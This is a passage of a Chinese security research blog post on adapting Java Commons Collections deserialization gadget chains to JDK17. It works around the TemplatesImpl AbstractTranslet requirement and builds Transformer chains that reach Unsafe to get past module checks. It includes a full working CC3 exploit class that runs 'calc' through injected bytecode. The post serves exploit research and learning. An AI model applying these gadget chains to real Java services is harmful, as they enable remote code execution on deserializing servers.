+<h2 id="继承-AbstractTranslet-问题"><a href="#继承-AbstractTranslet-问题" class="headerlink" title="继承 AbstractTranslet 问题"></a>继承 AbstractTranslet 问题</h2><p>在学习 CC 链时我们知道，利用 TemplesImpl 加载字节码有以下条件：</p>
+<blockquote>
+<p>_name 不为空，恶意类的父类是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</p>
+</blockquote>
+<p>由于 Jdk17 对 com.sun 包下的类都做了限制，不能直接访问，所以我们就要想办法看看能不能不去继承 AbstractTranslet</p>
+<p><strong>先回顾一下为什么要继承 AbstractTranslet</strong>：</p>
+<p>在下面这半条链执行的过程中</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">    TemplatesImpl.newTransformer()</span><br><span class="line">        TemplatesImpl.getTransletInstance()</span><br><span class="line">            TemplatesImpl.defineTransletClasses()</span><br><span class="line">                TransletClassLoader.defineClass()</span><br></pre></td></tr></table></figure></div>
+
+<p>在 TemplatesImpl.defineTransletClasses() 里进行了 defineClass()：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756881824250-d3c3afe1-15da-4e09-83dd-9f64407d1b1b.png"
+                     
+                ></p>
+<p>执行完 TemplatesImpl.defineTransletClasses() 出来之后，回到 TemplatesImpl.getTransletInstance()，调用 newInstance() 进行实例化，此时才会触发我们的恶意代码：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756881938972-e8de3ca8-e035-4478-9c5e-288857d4066d.png"
+                     
+                ></p>
+<p>但是如果我们的恶意类的父类不是 AbstractTranslet 的话，就会走到 else</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756882070922-418f0ef6-d082-4990-b52c-6c01ca964e75.png"
+                     
+                ></p>
+<p>而按照我们原本的 payload，这个 _auxClasses 为 null，走到这里就会报空指针错误，导致还没 newInstance() 就抛出异常提前结束了</p>
+<p>这时候我们想的肯定是给 _auxClasses 赋个值，但是它是 transient 的，赋值了也没用</p>
+<p>但是好在这个函数里有给它赋值的地方：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756885782990-b48b0317-749b-4107-860e-88e3194301f5.png"
+                     
+                ></p>
+<p>所以我们只要在 _bytecodes 里面多放一个字节数组即可，不过要注意这里一定要是一个符合规范的 java 类字节码，如果放一个 new byte[0] 的话，在 defineClass 时会抛出异常</p>
+<p>光这样还不够，由于我们没有继承 AbstractTranslet，所以没有进入下面给 _transletIndex 赋值这一步</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756886061160-9923a536-dbd2-4935-ace5-0d0e375ab197.png"
+                     
+                >这个值的初始值是 -1，如果不去修改就会进入下面的判断，导致抛出异常：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756886120877-830d7c70-2c75-4aa4-a1a4-5a7dc01bc105.png"
+                     
+                ></p>
+<p>这里用 Jdk8 下的 CC3 跑了一下：</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.utils.ReflectUtil;</span><br><span class="line"><span class="keyword">import</span> com.utils.SerializeUtil;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(</span><br><span class="line">                        TrAXFilter.class</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;getTemplates()&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 链子前半段和 CC1 一样</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;useless&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> ReflectUtil.newInstance(</span><br><span class="line">                Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;,</span><br><span class="line">                <span class="comment">// 必须传一个有变量的注解类</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Target.class, transformedMap&#125;</span><br><span class="line">        );</span><br><span class="line">        SerializeUtil.test(handler);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">getTemplates</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//        String AbstractTranslet = &quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="comment">//        classPool.appendClassPath(AbstractTranslet);</span></span><br><span class="line">        <span class="comment">// 设置父类，目的是满足 defineTransletClasses() 中的</span></span><br><span class="line">        <span class="comment">// if (superClass.getName().equals(ABSTRACT_TRANSLET))</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">evil</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Evil&quot;</span>);</span><br><span class="line"><span class="comment">//        evil.setSuperclass(classPool.get(AbstractTranslet));</span></span><br><span class="line">        evil.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">// 恶意类创建完成，下面创建 TemplatesImpl</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">TemplatesImpl</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        Class&lt;?&gt; templatesClass = Class.forName(TemplatesImpl);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> (TemplatesImpl) templatesClass.newInstance();</span><br><span class="line">        <span class="comment">// 为了过 getTransletInstance() 中的判断：if (_name == null) return null;</span></span><br><span class="line">        ReflectUtil.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;useless&quot;</span>);</span><br><span class="line">        <span class="comment">// 写入恶意字节码</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">useless</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Useless&quot;</span>);</span><br><span class="line">        ReflectUtil.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evil.toBytecode(), useless.toBytecode()&#125;);</span><br><span class="line"><span class="comment">//        ReflectUtil.setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span></span><br><span class="line">        ReflectUtil.setFieldValue(templates, <span class="string">&quot;_transletIndex&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">//		AnnotationInvocationHandler.readObject()</span></span><br><span class="line"><span class="comment">//			MapEntry.setValue()</span></span><br><span class="line"><span class="comment">//				TransformedMap.checkSetValue()</span></span><br><span class="line"><span class="comment">//					ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">//						ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">//						InstantiateTransformer.transform()</span></span><br><span class="line"><span class="comment">//							TrAXFilter.TrAXFilter()</span></span><br><span class="line"><span class="comment">//								TemplatesImpl.newTransformer()</span></span><br><span class="line"><span class="comment">//								TemplatesImpl.getTransletInstance()</span></span><br><span class="line"><span class="comment">//								TemplatesImpl.defineTransletClasses()</span></span><br><span class="line"><span class="comment">//								TemplatesImpl.TransletClassLoader.defineClass()</span></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756886311240-c26f17ec-5b4c-49b1-b703-04bfeaf09864.png"
+                     
+                ></p>
+<h2 id="反序列化时模块检测的绕过"><a href="#反序列化时模块检测的绕过" class="headerlink" title="反序列化时模块检测的绕过"></a>反序列化时模块检测的绕过</h2><p>前面我们绕过了 TemplatesImpl.defineTransletClasses() 中类加载时的异常问题，但是代码执行还需要回到 TemplatesImpl.getTransletInstance()，调用 newInstance() 进行实例化</p>
+<p>但是在 Jdk17 下存在<strong>模块检测</strong>，在后面调用 newInstance() 对恶意类进行初始化时会检测到恶意反射</p>
+<p>前面我们写的通过 Unsafe 类修改当前类的 Module 来绕过模块检测，是在<strong>本地</strong>实现的</p>
+<p>而反序列化这个流程是在<strong>服务端</strong>执行的，想要绕过检测必须在服务端也使用 Unsafe 去 patchModule</p>
+<p>Unsafe 类是不可序列化的，想要拿到它只能通过反射，这和 CC 链获取 Runtime 实例很像。于是我们很容易想到可以利用 InvokerTransformer#transform 去反射获取 Unsafe</p>
+<h3 id="构造-Transformer-数组"><a href="#构造-Transformer-数组" class="headerlink" title="构造 Transformer 数组"></a>构造 Transformer 数组</h3><p>先看一下获取 Unsafe 的流程：</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; unsafeClass = Class.forName(<span class="string">&quot;sun.misc.Unsafe&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">theUnsafeField</span> <span class="operator">=</span> unsafeClass.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">theUnsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">unsafe = (Unsafe) theUnsafeField.get(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>再看一下 CC 链中利用 InvokerTransformer#transform 获取 Runtime 的流程：</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(  </span><br><span class="line">                        Runtime.class  </span><br><span class="line">                ),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(  </span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,  </span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,  </span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;  </span><br><span class="line">                ),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(  </span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,  </span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,  </span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;  </span><br><span class="line">                ),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(  </span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>,  </span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,  </span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;  </span><br><span class="line">                )  </span><br><span class="line">        &#125;; </span><br></pre></td></tr></table></figure></div>
+
+<p>那么同样，我们第一步应该传一个 Unsafe 的 class 对象：</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(</span><br><span class="line">                sun.misc.Unsafe.class</span><br><span class="line">        )</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
+
+<p>然后第二个要 InvokerTransformer，里面传我们要调用的方法名、参数类的class对象、参数</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(</span><br><span class="line">                sun.misc.Unsafe.class</span><br><span class="line">        ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;getDeclaredField&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;theUnsafe&quot;</span>&#125;</span><br><span class="line">        )</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
+
+<p>下一步是 setAccessible：</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(</span><br><span class="line">                sun.misc.Unsafe.class</span><br><span class="line">        ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;getDeclaredField&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;theUnsafe&quot;</span>&#125;</span><br><span class="line">        ),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;setAccessible&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">boolean</span>.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">true</span>&#125;</span><br><span class="line">        )</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
+
+<p>但是接下来就不好继续了，调用 Runtime 这么写是因为前面获得的对象刚好是后面要调用的：</p>
+<blockquote>
+<p>Runtime.class 调 getMethod 返回 Method 对象</p>
+<p>Method 对象 调 invoke（执行 getRuntime）返回 Runtime 对象</p>
+<p>Runtime 对象 调 exec 命令执行</p>
+</blockquote>
+<p>而我们执行完 setAccessible 得到的是空</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756894188038-e6e367d7-23e3-4505-990f-c78244b891b7.png"
+                     
+                ></p>
+<p>这样接下来我们就没办法继续对 Field 继续操作了</p>
+<p>所以我们大概需要这样的一个 Transformer：</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> T <span class="title function_">transform</span><span class="params">(<span class="keyword">final</span> T input)</span> &#123;</span><br><span class="line">        iTransformer.transform(input);</span><br><span class="line">        <span class="keyword">return</span> input;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>能够对输入的对象调用一次 transform，还能在结束后返回一开始的对象，以便于再次对这个对象调用一次 transform</p>
+<p>可惜并没有这样的 Transformer，不过 Jiecub3 师傅找到了这样一个组合：</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ClosureTransformer</span><br><span class="line"><span class="keyword">public</span> T <span class="title function_">transform</span><span class="params">(<span class="keyword">final</span> T input)</span> &#123;</span><br><span class="line">        iClosure.execute(input);</span><br><span class="line">        <span class="keyword">return</span> input;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">TransformerClosure</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(<span class="keyword">final</span> E input)</span> &#123;</span><br><span class="line">        iTransformer.transform(input);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>先看 ClosureTransformer，它接受的参数和返回的参数和我们期望的一样，只不过它调用的是 execute 方法。那么假如 execute 方法里面能够调用我们可控的对象的 transform 方法就刚好满足了条件</p>
+<p>并且刚好 TransformerClosure 就是 iClosure 的类型</p>
+<p>继续完善 demo：</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.Class;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(</span><br><span class="line">                        sun.misc.Unsafe.class</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getDeclaredField&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;theUnsafe&quot;</span>&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ClosureTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">TransformerClosure</span>(</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                                        <span class="string">&quot;setAccessible&quot;</span>,</span><br><span class="line">                                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;<span class="type">boolean</span>.class&#125;,</span><br><span class="line">                                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">true</span>&#125;</span><br><span class="line">                                )</span><br><span class="line">                        )</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;get&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>&#125;</span><br><span class="line">                )</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;bin1&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(chainedTransformer);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;bin1&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">o1</span> <span class="operator">=</span> (Transformer) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">transform</span> <span class="operator">=</span> o1.transform(<span class="literal">null</span>);</span><br><span class="line">        System.out.println(transform);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>现在拿到了 Unsafe 对象，接下来就是 patchModule 了</p>
+<p>之前我我们是通过把调用类的 Module 改成 Object.class 的 Module 来绕过模块检测的</p>
+<p>也就是最终要通过 <code>unsafe.getAndSetObject(currentClass, addr, baseModule);</code> 来实现</p>
+<p>第一个参数是当前类对象，第二个是数字，都可以正常传，但是第三个变量是 Module</p>
+<p><strong>Module 类不能序列化</strong>：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2025/png/42454107/1756961037262-a8227f06-5c11-45ee-a3a1-f997b8ea07d3.png"
+                     
+                ></p>
+<p>现在改 Module 为 Object.class 的 Module 看上去是行不通了：我们没办法传 Object.class 的 Module，就算哪个可控的方法能获得 Object.class 的 Module，我们也没办法传到 getAndSetObject 这个方法的参数的位置</p>
+<p>前面我们绕过模块检测的时候是选择了一个最简单的方式，那有没有别的办法呢？</p>
+<p>并且前面我们是从 setAccessible 去分析的，而这里要绕过的是对 newInstance 的检测</p>
+<h3 id="分析绕过-newInstance"><a href="#分析绕过-newInstance" class="headerlink" title="分析绕过 newInstance"></a>分析绕过 newInstance</h3><p>写一个新的 Test 进行调试：</p>
